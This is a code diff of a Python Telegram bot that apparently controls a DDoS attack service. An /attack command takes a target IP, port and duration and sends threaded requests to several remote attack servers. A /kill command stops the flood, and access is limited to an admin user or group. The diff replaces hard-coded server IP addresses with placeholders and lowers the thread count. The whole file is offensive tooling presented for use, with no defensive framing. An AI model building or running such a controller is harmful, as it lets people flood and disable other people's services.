@@ -2,21 +2,21 @@ from telegram.ext import Updater, CommandHandler, Filters
 import requests
 import threading
 
-group_id = -1002005767506
-your_user_id = 5561757248
+group_id = id_group
+your_user_id = id_admin
 def start(update, context):
-    update.message.reply_text("👋Hello User, Use /attack to send attack")
+    update.message.reply_text("👋Hello User\n➤Use /attack to send attack\n➤Use /kill to stop attack")
 def send_request(url):
     requests.get(url)
 def kill(update, context):
     if update.message.chat_id != your_user_id and update.message.chat_id != group_id:
         return
 
-    url1 = f"http://152.42.211.83/?action=kill"
-    url2 = f"http://152.42.202.243/?action=kill"
-    url3 = f"http://128.199.84.155/?action=kill"
-    url4 = f"http://128.199.112.20/?action=kill"
-    url5 = f"http://152.42.165.62/?action=kill"
+    url1 = f"http://api/?action=kill"
+    url2 = f"http://api/?action=kill"
+    url3 = f"http://api/?action=kill"
+    url4 = f"http://api/?action=kill"
+    url5 = f"http://api/?action=kill"
 
     thread1 = threading.Thread(target=send_request, args=(url1,))
     thread2 = threading.Thread(target=send_request, args=(url2,))
@@ -43,11 +43,11 @@ def attack(update, context):
 
     ip, port, time = args
 
-    url1 = f"http://api/?ip={ip}&port={port}&thread=100&time={time}"
-    url2 = f"http://api?ip={ip}&port={port}&thread=100&time={time}"
-    url3 = f"http://api/?ip={ip}&port={port}&thread=100&time={time}"
-    url4 = f"http://api/?ip={ip}&port={port}&thread=100&time={time}"
-    url5 = f"http://api/?ip={ip}&port={port}&thread=100&time={time}"
+    url1 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"
+    url2 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"
+    url3 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"
+    url4 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"
+    url5 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"
 
     thread1 = threading.Thread(target=send_request, args=(url1,))
     thread2 = threading.Thread(target=send_request, args=(url2,))
